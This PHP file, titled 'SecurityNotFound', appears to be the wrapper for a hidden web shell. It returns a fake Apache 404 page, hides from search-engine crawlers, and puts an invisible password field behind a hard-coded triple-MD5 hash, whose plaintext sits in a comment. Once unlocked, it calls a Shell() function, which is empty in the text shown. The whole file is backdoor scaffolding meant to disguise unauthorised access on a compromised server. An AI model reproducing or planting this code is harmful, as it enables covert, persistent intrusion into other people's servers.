<?php

  /* Metadata
  >>>>>>>>>>>>>>>>> */
  define('__NAME__', 'SecurityNotFound');
  define('__AUTHOR__', '@CosasDePuma');

  /* Variables
  >>>>>>>>>>>>>>>>> */
  $passphrase = '136c757bdd877848762c248e58252935'; // cosasdepuma

  /* Headers
  >>>>>>>>>>>>>>>>> */
  header('HTTP/1.0 404 Not Found');
  header('X-Powered-By: Unicorns and kitties <3');

  /* Robots
  >>>>>>>>>>>>>>>>> */
  $robots = array(
    'Google', 'Yandex', 'MSNBot', 'Slurp', 'Rambler', 'ia_archiver'
  );

  foreach($robots as $robot)
    if(strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false)
      exit;

  /* Functions
  >>>>>>>>>>>>>>>>> */
  function ApacheNotFound() {
    ?>
  
    <h1>Not Found</h1>
    <p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
    <hr>
    <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>

    <center>
      <form method="post">
        <input style="margin:0;background-color:#fff;border:0px" type="password" name="passwd">
      </form>
    </center>

    <?php exit;
  }

  function Shell() {
    ?>
    
    <?php
  }

  /* Workflow
  >>>>>>>>>>>>>>>>> */
  if(isset($_GET['out'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    header("Refresh:0; url=" . explode('?', $_SERVER[REQUEST_URI])[0]);
    die();
  }

  if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase))) {
      $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
      ApacheNotFound();
    }
  } else {
    Shell();
  }
?>